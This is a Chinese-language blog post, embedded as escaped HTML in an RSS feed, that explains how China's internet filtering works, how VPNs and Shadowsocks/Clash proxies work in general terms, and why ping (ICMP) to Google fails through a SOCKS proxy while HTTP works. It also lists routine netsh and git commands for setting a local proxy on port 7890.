&lt;p&gt;可能大家以后学习安全的方向不尽相同，但是如果你在&lt;a class=&#34;link&#34; href=&#34;https://www.sec-wiki.com/skill/index&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;secwiki&lt;/a&gt;上查找过的话，可以发现有一条打造科学的工作环境，这其中就包括学会使用谷歌搜索。更何况现在，我认为这正在逐渐向基本的生活技能靠拢……不单单搜谷歌，查文献，steam社区，逛github这些也很有必要。&lt;/p&gt;
&lt;p&gt;之前一直在用QQ浏览器，有的地方被坑惨了（真的，推荐大家一开始就用谷歌浏览器，特别是web方向）。换了之后界面简洁，而且hackbar这些插件也十分方便，最主要的是没啥大病，不会在该弹出下载的地方给你弹出404。&lt;/p&gt;
&lt;p&gt;有什么好处？&lt;/p&gt;
&lt;p&gt;可以访问真正的互联网，将你的信息接收范围面向世界。
方便做很多事情。&lt;/p&gt;
&lt;p&gt;当然，最重要的是注意分辨言论，自身安全，保护隐私，相信这点大家都明白，都可以做到，这也是对大家的信任。&lt;/p&gt;
&lt;p&gt;最后，如果可以看 Youtube 视频，直接看&lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=XKZM_AjCUr0&amp;amp;list=PLqybz7NWybwUgR-S6m78tfd-lV4sBvGFG&amp;amp;index=1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这个&lt;/a&gt;系列，我写的只能算简单概括吧。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最后！！&lt;/strong&gt;
所以文章里不会提及具体方式的哦，只是想简单普及一下，不想让大家像我之前一样迷迷糊糊的。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;why-not-一&#34;&gt;why not （一）
&lt;/h1&gt;&lt;p&gt;墙墙是啥？&lt;/p&gt;
&lt;p&gt;通过&lt;strong&gt;IP地址封锁&lt;/strong&gt;，&lt;strong&gt;端口阻断&lt;/strong&gt;，&lt;strong&gt;DNS劫持和污染&lt;/strong&gt;，&lt;strong&gt;关键字屏蔽&lt;/strong&gt; 等技术对认为不符合要求（可以搜下审查制度）的互联网国际出口传输内容，进行干扰、阻断、屏蔽。
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 202; 
			flex-basis: 486px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/3.jpg&#34; data-size=&#34;1363x672&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/3.jpg&#34;
			width=&#34;1363&#34;
			height=&#34;672&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/3_hucd40f92ee44ab54ccf4818a6ef68cf0d_110433_480x0_resize_q75_box.jpg 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/3_hucd40f92ee44ab54ccf4818a6ef68cf0d_110433_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;why-can-一&#34;&gt;why can （一）
&lt;/h1&gt;&lt;p&gt;接下来，是为什么又能在浏览器访问到谷歌。这里有两种原理。&lt;/p&gt;
&lt;h2 id=&#34;1vpn&#34;&gt;1.VPN
&lt;/h2&gt;&lt;p&gt;刚刚说了，墙墙屏蔽的是那些不符合审查制度的网站，如果我们连接一台墙墙认为合理的服务器，把它作为一层代理，去完成用户想要做的事情，最后再返回结果，不就可以了吗？不由得去想谁能干这样的事情，VPN呀（virtual private network）！&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 204; 
			flex-basis: 491px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/4.jpg&#34; data-size=&#34;1364x666&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/4.jpg&#34;
			width=&#34;1364&#34;
			height=&#34;666&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/4_huee8dd0466f2863b2743a3ce3b6674e9b_90707_480x0_resize_q75_box.jpg 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/4_huee8dd0466f2863b2743a3ce3b6674e9b_90707_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;img&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;img&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;吼吼，看上去十分完美，但是……慢慢的，墙墙发现越来越多的流量都是先发送一个数据包请求和一个服务器建立加密连接，然后紧跟着一个代理请求，于是这种特征就被识别出来了，就寄了。（特征一被识别，提供 VPN 服务的服务器 IP 地址就会被封了）&lt;/p&gt;
&lt;h2 id=&#34;2shadowsocks&#34;&gt;2.Shadowsocks
&lt;/h2&gt;&lt;p&gt;接下来，一个更新的技术出现了，Shadowsocks（这既是一个技术的名字又是一类客户端的名字）。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 179; 
			flex-basis: 430px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/5.jpg&#34; data-size=&#34;1810x1009&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/5.jpg&#34;
			width=&#34;1810&#34;
			height=&#34;1009&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/5_hu56bf9ae0d2cdeb6aa88fc257edcd23a1_519710_480x0_resize_q75_box.jpg 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/5_hu56bf9ae0d2cdeb6aa88fc257edcd23a1_519710_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;img&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;img&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Shadowsocks是将代理服务器拆开成Server端和client端，中间使用了socks网络传输协议。Socks 代理与应用层代理、 HTTP 层代理不同，Socks 代理只是简单地传递数据包，所以可以实现经过 墙墙量全部加密，从而消除明显的流量特征这个概念。&lt;/p&gt;
&lt;h1 id=&#34;how一&#34;&gt;how（一）
&lt;/h1&gt;&lt;p&gt;现在我们简单了解了墙墙 的大概工作思路，以及VPN和Shadowsocks的工作思路，我们再来看看理论上有几种方式实现。&lt;/p&gt;
&lt;h2 id=&#34;软件方向&#34;&gt;软件方向
&lt;/h2&gt;&lt;h3 id=&#34;1vpn-1&#34;&gt;1.VPN
&lt;/h3&gt;&lt;p&gt;虚拟私有网络，最早应用于一些大公司中，因私密通信的需求而产生，是一种端对端的虚拟私有专线，可避免通讯流量被中间人劫持。&lt;/p&gt;
&lt;p&gt;也就是说，访问谷歌能只是VPN刚好可以做到的，人家本来没想要干这个，而且VPN流量特征明显，早就可以被 GFW 完美探测并封锁。&lt;/p&gt;
&lt;p&gt;只有申请报备的企业用户才可正常使用VPN，比如科研机构，大型企业之类的。&lt;/p&gt;
&lt;p&gt;顺便吐槽一下，我手机里以前那些免费加速器基本都属于这种。&lt;/p&gt;
&lt;h3 id=&#34;2shadowsocks-及衍生品&#34;&gt;2.Shadowsocks 及衍生品
&lt;/h3&gt;&lt;p&gt;该类软件利用本地服务器加密流量，然后将加密流量发送至远程服务器解密。&lt;/p&gt;
&lt;p&gt;常见的应用软件有 Shadowsocks、ShadowsocksR、Shadowrocket、V2Ray、Clash、Surge。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;clash&lt;/strong&gt;是使用 GO 开的发一个基于规则的隧道代理软件，支持 HTTP/HTTPS/SOCKS/Shadowsocks/ShadowsocksR/V2Ray/Trojan 协议, 能更好的使用处理规则（就是你规定它该连啥）&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 200; 
			flex-basis: 480px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/download.png&#34; data-size=&#34;318x159&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/download.png&#34;
			width=&#34;318&#34;
			height=&#34;159&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/download_hu109ae194a1ca4c8a912d470a5f6e0278_2842_480x0_resize_box_3.png 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/download_hu109ae194a1ca4c8a912d470a5f6e0278_2842_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;download&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;download&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;硬件方向&#34;&gt;硬件方向
&lt;/h2&gt;&lt;h3 id=&#34;1路由&#34;&gt;1.路由
&lt;/h3&gt;&lt;p&gt;没错！&lt;/p&gt;
&lt;p&gt;将上面的软件部署在了路由器上，连接路由器的设备都可以通过路由器访问到谷歌。&lt;/p&gt;
&lt;p&gt;很不错的想法，但是遗憾的是大部分路由器在设计的时候算力只能满足基本的路由功能，而在通信产生大量的加解密运算，路由器算不过来，网就卡了……&lt;/p&gt;
&lt;p&gt;接着往下看，还有更好的方法。&lt;/p&gt;
&lt;h3 id=&#34;2-软路由&#34;&gt;2. 软路由
&lt;/h3&gt;&lt;p&gt;新主意，利用台式机或服务器配合软件形成路由解决方案，主要靠软件的设置，达成路由器的功能。这样既有《全局代理》的效果，又有足够的算力。&lt;/p&gt;
&lt;p&gt;但是缺点。。。比较麻烦。。。
接着往下看，还有更好的方法。&lt;/p&gt;
&lt;h3 id=&#34;3网关模式&#34;&gt;3.网关模式
&lt;/h3&gt;&lt;p&gt;通过一台计算机上跑的软件来实现路由器功能，代表性产品：Windows 下的 Clash，Mac 下的 Surge。&lt;/p&gt;
&lt;p&gt;相当于在本地局域网里部署了一个开启Clash或Surge的电脑当网关，任何在局域网内的设备都可以将此网关作为代理，访问互联网。&lt;/p&gt;
&lt;p&gt;这样有几个好处，一是效率高，方便；二是便于集中管理。&lt;/p&gt;
&lt;h1 id=&#34;why-not-二&#34;&gt;why not （二）
&lt;/h1&gt;&lt;p&gt;讲了这么多，还是不知道为什么不能ping到google。&lt;/p&gt;
&lt;p&gt;其实原因很简单，&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SOCKS协议在会话层 (第五层)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ICMP协议在网络层(第三层)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;而ping用的是ICMP协议。&lt;/p&gt;
&lt;p&gt;众所周知：前朝的剑斩不了本朝的官。
我拿上层的协议，去代理下层的服务？&lt;/p&gt;
&lt;p&gt;而我们之所以能够访问google是因为使用http协议，在&lt;strong&gt;应用层(第七层)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 177; 
			flex-basis: 426px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/1.png&#34; data-size=&#34;1277x719&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/1.png&#34;
			width=&#34;1277&#34;
			height=&#34;719&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/1_hu27d5c098c017076f48d4293e7e33a2ab_488644_480x0_resize_box_3.png 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/1_hu27d5c098c017076f48d4293e7e33a2ab_488644_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;1&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;1&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;how二&#34;&gt;how（二）
&lt;/h1&gt;&lt;p&gt;于是我们来解决这个问题，怎么ping到google？&lt;/p&gt;
&lt;p&gt;这里clash有个很好的功能，虚拟网卡。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TUN&lt;/strong&gt;与&lt;strong&gt;TAP&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在计算机网络中，&lt;strong&gt;TUN&lt;/strong&gt;与&lt;strong&gt;TAP&lt;/strong&gt;是操作系统内核中的虚拟网络设备。不同于普通靠硬件网络适配器实现的设备，这些虚拟的网络设备全部用软件实现，并向运行于操作系统上的软件提供与硬件的网络设备完全相同的功能。&lt;/p&gt;
&lt;p&gt;TAP等同于一个以太网设备，它操作第二层数据包如以太网数据帧。TUN模拟了网络层设备，操作第三层数据包比如IP数据包。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 111; 
			flex-basis: 268px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/12.png&#34; data-size=&#34;201x180&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/12.png&#34;
			width=&#34;201&#34;
			height=&#34;180&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/12_hufdca2f5e6053cff671745b6bf7dba609_145229_480x0_resize_box_3.png 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/12_hufdca2f5e6053cff671745b6bf7dba609_145229_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;12&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;12&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如图，被涂掉的网络是正常连的wifi，而下面的网络 3就是clash生成的虚拟网卡，就是这么神奇，clash的TAP 模式。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 139; 
			flex-basis: 333px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/11.png&#34; data-size=&#34;448x322&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/11.png&#34;
			width=&#34;448&#34;
			height=&#34;322&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/11_hu06809faec8021013e9d23dbf4a94042b_14668_480x0_resize_box_3.png 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/11_hu06809faec8021013e9d23dbf4a94042b_14668_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;11&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;11&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这样，我们就ping通google了。&lt;/p&gt;
&lt;p&gt;回到我最开始的目的，要更新github pages，就被轻而易举的解决了。&lt;/p&gt;
&lt;p&gt;但是还有其他的方法吗？&lt;/p&gt;
&lt;p&gt;有的。&lt;/p&gt;
&lt;p&gt;更改powershell的代理（要管理员权限）或者git的代理。（git以后会讲）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell设置代理
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netsh winhttp set proxy 127.0.0.1:7890
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;取消代理
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netsh winhttp reset proxy
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;查看代理
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netsh winhttp show proxy
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git全局代理
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global http.proxy http://127.0.0.1:7890
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global https.proxy http://127.0.0.1:7890
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git取消全局代理：
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global --unset http.proxy
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global --unset https.proxy
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;7890是我的默认代理端口&lt;/p&gt;
&lt;p&gt;这样直接输代码肯定比之前name一大堆简单的多，可是为什么这样修改之后可以上传github pages却不能ping google呢？&lt;/p&gt;
&lt;p&gt;原因很明显，就是git和windows powershell 在osi模型上的层数在第三层之上，修改他们的代理也无法代理ICMP协议，也就ping不了google。但是连接github pages却用的更上层的协议。&lt;/p&gt;
&lt;h1 id=&#34;最后&#34;&gt;最后
&lt;/h1&gt;&lt;p&gt;最后再解释几个名词&lt;/p&gt;
&lt;p&gt;机场：提供特殊的、以私密方式上网的服务商（或平台）。&lt;/p&gt;
&lt;p&gt;VPS：Virtual Private Server
是将一台服务器分割成多个虚拟专用服务器的服务。&lt;/p&gt;
&lt;p&gt;可以这么理解，一些专业的人建立了很多VPS来付费（或免费）提供服务，这样你就不用再辛苦从外面买一台主机当做服务端了，用人家配好的就能直接访问谷歌。&lt;/p&gt;
&lt;p&gt;这些VPS放到一起，就变成了一个机场，可以供用户切换线路，找到不同的服务端。&lt;/p&gt;
&lt;p&gt;ps：想了解更多的推荐去看前面推荐的视频。&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
